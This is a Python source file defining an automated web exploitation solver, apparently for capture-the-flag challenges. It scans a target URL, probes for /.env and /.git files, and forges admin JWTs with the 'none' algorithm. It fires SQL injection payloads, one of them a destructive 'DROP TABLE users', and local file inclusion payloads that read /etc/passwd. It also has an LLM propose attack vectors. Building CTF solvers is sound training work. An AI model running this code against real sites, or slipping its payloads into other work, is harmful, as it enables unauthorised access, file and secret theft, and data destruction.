"""
Web Solver — web exploitation and reconnaissance.

Strategies:
  1. source_inspection   — check page source, HTML comments, JS
  2. robots_sitemap      — check robots.txt, sitemap.xml
  3. http_headers        — inspect response headers, cookies
  4. directory_brute     — brute-force directories with gobuster/ffuf
  5. sqli_basic          — basic SQL injection tests
  6. jwt_tampering       — JWT none algorithm / weak key attacks
  7. cookie_analysis     — decode/tamper cookies
  8. lfi_test            — local file inclusion payloads
  9. llm_web             — LLM-guided analysis
"""

from __future__ import annotations

import base64
import json
import re
from typing import Optional, Callable
from urllib.parse import urljoin, urlparse

import requests

from agent.solvers.base import BaseSolver, SolveResult
from agent.analyzer import ChallengeInfo
from agent.reporter import SolveReport
from agent.validator import find_flags
from agent import tools
from agent import llm as llm_engine


class WebSolver(BaseSolver):

    @property
    def strategies(self) -> list[tuple[str, Callable]]:
        return [
            ("source_inspection",  self._source_inspection),
            ("robots_sitemap",     self._robots_sitemap),
            ("http_headers",       self._http_headers),
            ("cookie_analysis",    self._cookie_analysis),
            ("jwt_tampering",      self._jwt_tampering),
            ("sqli_basic",         self._sqli_basic),
            ("lfi_test",           self._lfi_test),
            ("directory_brute",    self._directory_brute),
            ("llm_web",            self._llm_web),
        ]

    def _get_url(self, info: ChallengeInfo) -> Optional[str]:
        if info.url:
            return info.url
        # Check if description contains a URL
        match = re.search(r'https?://[^\s<>"]+', info.description)
        return match.group(0) if match else None

    # ── Strategies ─────────────────────────────────────────────────────

    def _source_inspection(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        url = self._get_url(info)
        if not url:
            return None

        try:
            resp = requests.get(url, timeout=15, verify=False)
            text = resp.text

            # Check for flags in HTML source
            flags = find_flags(text)
            if flags:
                report.log("solve", "Flag found in page source")
                return SolveResult(flag=flags[0])

            # Check HTML comments
            comments = re.findall(r'<!--(.*?)-->', text, re.DOTALL)
            for comment in comments:
                flags = find_flags(comment)
                if flags:
                    report.log("solve", "Flag found in HTML comment")
                    return SolveResult(flag=flags[0])

            # Check linked JS files
            js_links = re.findall(r'src=["\']([^"\']*\.js[^"\']*)', text)
            for js_link in js_links[:5]:  # limit
                js_url = urljoin(url, js_link)
                try:
                    js_resp = requests.get(js_url, timeout=10, verify=False)
                    flags = find_flags(js_resp.text)
                    if flags:
                        report.log("solve", f"Flag found in JS: {js_link}")
                        return SolveResult(flag=flags[0])
                except Exception:
                    pass

            report.log("solve", "Source inspection: no flag", success=False)
            return SolveResult(artifacts={"source": text[:3000]})

        except Exception as exc:
            report.log("solve", f"HTTP request failed: {exc}", success=False)
            return None

    def _robots_sitemap(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        url = self._get_url(info)
        if not url:
            return None

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in ["/robots.txt", "/sitemap.xml", "/.git/HEAD",
                     "/.env", "/flag.txt", "/flag", "/.hidden"]:
            try:
                check_url = base + path
                resp = requests.get(check_url, timeout=10, verify=False)
                if resp.status_code == 200:
                    flags = find_flags(resp.text)
                    if flags:
                        report.log("solve", f"Flag found at {path}")
                        return SolveResult(flag=flags[0])
                    report.log("solve", f"Found {path}: {resp.text[:200]}")
            except Exception:
                pass

        return None

    def _http_headers(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        url = self._get_url(info)
        if not url:
            return None

        try:
            resp = requests.get(url, timeout=10, verify=False)
            headers_text = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())

            flags = find_flags(headers_text)
            if flags:
                report.log("solve", "Flag found in HTTP headers")
                return SolveResult(flag=flags[0])

            report.log("solve", "No flag in headers", success=False)
            return SolveResult(artifacts={"headers": headers_text})

        except Exception:
            return None

    def _cookie_analysis(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        url = self._get_url(info)
        if not url:
            return None

        try:
            session = requests.Session()
            resp = session.get(url, timeout=10, verify=False)

            for name, value in session.cookies.items():
                # Check raw cookie
                flags = find_flags(value)
                if flags:
                    report.log("solve", f"Flag found in cookie '{name}'")
                    return SolveResult(flag=flags[0])

                # Try base64 decode
                try:
                    decoded = base64.b64decode(value).decode("utf-8", errors="replace")
                    flags = find_flags(decoded)
                    if flags:
                        report.log("solve", f"Flag in base64-decoded cookie '{name}'")
                        return SolveResult(flag=flags[0])
                except Exception:
                    pass

        except Exception:
            pass

        return None

    def _jwt_tampering(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        url = self._get_url(info)
        if not url:
            return None

        try:
            session = requests.Session()
            resp = session.get(url, timeout=10, verify=False)

            # Find JWTs in cookies or response
            jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            all_text = resp.text + "\n"
            all_text += "\n".join(f"{v}" for v in session.cookies.values())

            tokens = re.findall(jwt_pattern, all_text)
            if not tokens:
                return None

            for token in tokens:
                parts = token.split(".")
                if len(parts) != 3:
                    continue

                # Decode payload
                payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
                try:
                    payload = json.loads(
                        base64.urlsafe_b64decode(payload_b64).decode()
                    )
                    payload_text = json.dumps(payload)
                    flags = find_flags(payload_text)
                    if flags:
                        report.log("solve", "Flag found in JWT payload")
                        return SolveResult(flag=flags[0])

                    report.log("solve", f"JWT payload: {payload_text}")

                    # Try "none" algorithm attack
                    header = json.loads(
                        base64.urlsafe_b64decode(
                            parts[0] + "=" * (4 - len(parts[0]) % 4)
                        ).decode()
                    )
                    header["alg"] = "none"

                    # Tamper: set admin=true if exists
                    if "admin" in payload:
                        payload["admin"] = True
                    if "role" in payload:
                        payload["role"] = "admin"

                    new_header = base64.urlsafe_b64encode(
                        json.dumps(header).encode()
                    ).rstrip(b"=").decode()
                    new_payload = base64.urlsafe_b64encode(
                        json.dumps(payload).encode()
                    ).rstrip(b"=").decode()
                    forged = f"{new_header}.{new_payload}."

                    # Try sending forged token
                    for cookie_name in session.cookies:
                        session.cookies.set(cookie_name, forged)

                    resp2 = session.get(url, timeout=10, verify=False)
                    flags = find_flags(resp2.text)
                    if flags:
                        report.log("solve", "Flag found via JWT none-algorithm attack")
                        return SolveResult(flag=flags[0])

                except Exception:
                    pass

        except Exception:
            pass

        return None

    def _sqli_basic(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        url = self._get_url(info)
        if not url:
            return None

        # Try basic SQL injection payloads on common parameters
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT NULL,NULL --",
            "1; DROP TABLE users --",
        ]

        try:
            # First, get the page to find forms
            resp = requests.get(url, timeout=10, verify=False)
            # Find form action and input names
            form_actions = re.findall(r'action=["\']([^"\']*)', resp.text)
            input_names = re.findall(r'name=["\']([^"\']*)', resp.text)

            if not input_names:
                input_names = ["username", "user", "login", "id", "search", "q"]

            for param in input_names[:3]:
                for payload in payloads:
                    try:
                        # GET
                        r = requests.get(url, params={param: payload},
                                         timeout=10, verify=False)
                        flags = find_flags(r.text)
                        if flags:
                            report.log("solve",
                                       f"SQLi flag via GET {param}={payload}")
                            return SolveResult(flag=flags[0])

                        # POST
                        r = requests.post(url, data={param: payload},
                                          timeout=10, verify=False)
                        flags = find_flags(r.text)
                        if flags:
                            report.log("solve",
                                       f"SQLi flag via POST {param}={payload}")
                            return SolveResult(flag=flags[0])

                    except Exception:
                        pass

        except Exception:
            pass

        return None

    def _lfi_test(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        url = self._get_url(info)
        if not url:
            return None

        lfi_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/convert.base64-encode/resource=flag",
            "php://filter/convert.base64-encode/resource=flag.php",
            "/flag.txt",
            "../flag.txt",
        ]

        # Find parameters that might be vulnerable
        params_to_try = ["file", "page", "path", "include", "view",
                         "template", "doc", "f"]

        try:
            for param in params_to_try:
                for payload in lfi_payloads:
                    try:
                        r = requests.get(url, params={param: payload},
                                         timeout=10, verify=False)
                        if r.status_code == 200 and len(r.text) > 0:
                            flags = find_flags(r.text)
                            if flags:
                                report.log("solve",
                                           f"LFI flag via {param}={payload}")
                                return SolveResult(flag=flags[0])

                            # Check if we got /etc/passwd (confirms LFI)
                            if "root:" in r.text:
                                report.log("solve",
                                           f"LFI confirmed via {param}. "
                                           "Attempting flag read...")
                                # Now try to read flag
                                for flag_path in ["/flag.txt", "/flag",
                                                  "/home/ctf/flag.txt"]:
                                    r2 = requests.get(
                                        url, params={param: flag_path},
                                        timeout=10, verify=False)
                                    flags = find_flags(r2.text)
                                    if flags:
                                        return SolveResult(flag=flags[0])

                            # base64 filter response
                            if "php://filter" in payload:
                                try:
                                    decoded = base64.b64decode(r.text.strip())
                                    text = decoded.decode("utf-8", errors="replace")
                                    flags = find_flags(text)
                                    if flags:
                                        report.log("solve",
                                                   "Flag in php://filter output")
                                        return SolveResult(flag=flags[0])
                                except Exception:
                                    pass
                    except Exception:
                        pass
        except Exception:
            pass

        return None

    def _directory_brute(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        url = self._get_url(info)
        if not url:
            return None

        # Quick manual check of common paths
        common_paths = [
            "/admin", "/login", "/flag", "/secret", "/hidden",
            "/backup", "/debug", "/console", "/api", "/api/flag",
            "/shell", "/.git", "/.svn", "/config",
        ]

        try:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"

            for path in common_paths:
                try:
                    r = requests.get(base + path, timeout=8, verify=False)
                    if r.status_code == 200:
                        flags = find_flags(r.text)
                        if flags:
                            report.log("solve", f"Flag found at {path}")
                            return SolveResult(flag=flags[0])
                except Exception:
                    pass
        except Exception:
            pass

        return None

    def _llm_web(
        self, info: ChallengeInfo, report: SolveReport
    ) -> Optional[SolveResult]:
        url = self._get_url(info)
        context_parts = [f"URL: {url or 'N/A'}"]

        if info.description:
            context_parts.append(f"Description: {info.description}")

        try:
            if url:
                resp = requests.get(url, timeout=10, verify=False)
                context_parts.append(f"Page source:\n{resp.text[:2000]}")
        except Exception:
            pass

        try:
            response = llm_engine.solve_puzzle(
                "This is a web exploitation CTF challenge. Analyze and suggest "
                "attack vectors.",
                context="\n".join(context_parts),
            )
            flags = find_flags(response)
            if flags:
                report.log("solve", "LLM found the flag")
                return SolveResult(flag=flags[0])
            report.log("solve", "LLM web analysis",
                       detail=response[:500], success=False)
        except Exception as exc:
            report.log("solve", f"LLM failed: {exc}", success=False)

        return None
